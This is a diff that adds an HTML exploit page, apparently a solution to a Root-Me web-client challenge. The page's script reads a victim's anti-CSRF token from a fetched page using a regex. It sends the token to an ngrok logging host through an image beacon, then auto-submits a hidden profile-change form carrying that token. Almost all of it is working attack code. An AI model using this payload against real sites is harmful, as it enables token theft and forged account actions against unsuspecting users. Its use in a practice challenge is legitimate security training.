@@ -1,0 +1,30 @@
+<html>
+  <body>
+    <form action="http://challenge01.root-me.org/web-client/ch23/?action=profile"
+          method="POST"
+          enctype="multipart/form-data">
+
+      <input type="hidden" name="username" value="oo" />
+      <input type="hidden" name="status" value="on" />
+      <input type="hidden" name="token" id="token" value="token" />
+
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+		  new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?token=oooo";
+		  var url = "";
+		  var loadProfile = new XMLHttpRequest();
+		  loadProfile.open("GET", url, false);
+		  loadProfile.send();
+
+		  var regex = /name="token"\s+value="([a-f0-9]{32})"/i;
+		  var match = regex.exec(loadProfile.responseText);
+		  var token =match[1];
+
+		  new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?token=" + token;
+		  document.getElementById("token").value = token;
+		  document.forms[0].submit();
+    </script>
+  </body>
+</html>
